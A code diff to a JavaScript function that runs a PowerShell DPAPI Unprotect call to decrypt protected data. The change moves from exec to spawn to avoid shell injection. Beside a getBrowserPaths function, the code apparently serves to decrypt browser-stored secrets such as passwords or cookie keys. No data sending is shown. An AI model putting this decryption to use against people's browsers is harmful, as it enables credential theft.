@@ -54,24 +54,29 @@ function getBrowserPaths() {
 function decryptDpapi(encryptedBase64) {
   return new Promise((resolve) => {
     if (!encryptedBase64) return resolve(null);
-    
+
     const psScript = `
       Add-Type -AssemblyName System.Security
       $bytes = [Convert]::FromBase64String('${encryptedBase64}')
       $decoded = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
       [Convert]::ToBase64String($decoded)
     `;
-    
-    const { exec } = require('child_process');
-    exec(`powershell -NoProfile -Command "${psScript}"`, { maxBuffer: 1024 * 1024 }, (err, stdout) => {
-      if (err || !stdout.trim()) {
-        console.error('DPAPI Decrypt failed:', err);
-        resolve(null);
-      } else {
-        try {
-          resolve(Buffer.from(stdout.trim(), 'base64'));
-        } catch (e) { resolve(null); }
+
+    // spawn with an argv array — no cmd.exe shell in the middle, so the
+    // script can never be re-interpreted as a command line
+    const { spawn } = require('child_process');
+    const ps = spawn('powershell', ['-NoProfile', '-NonInteractive', '-Command', psScript], { windowsHide: true });
+    let stdout = '';
+    let settled = false;
+    const finish = (value) => { if (!settled) { settled = true; resolve(value); } };
+    ps.stdout.on('data', c => { stdout += c; });
+    ps.on('error', (err) => { console.error('DPAPI Decrypt failed:', err); finish(null); });
+    ps.on('close', (code) => {
+      if (code !== 0 || !stdout.trim()) {
+        console.error('DPAPI Decrypt failed, exit code:', code);
+        return finish(null);
       }
+      try { finish(Buffer.from(stdout.trim(), 'base64')); } catch (e) { finish(null); }
     });
   });
 }
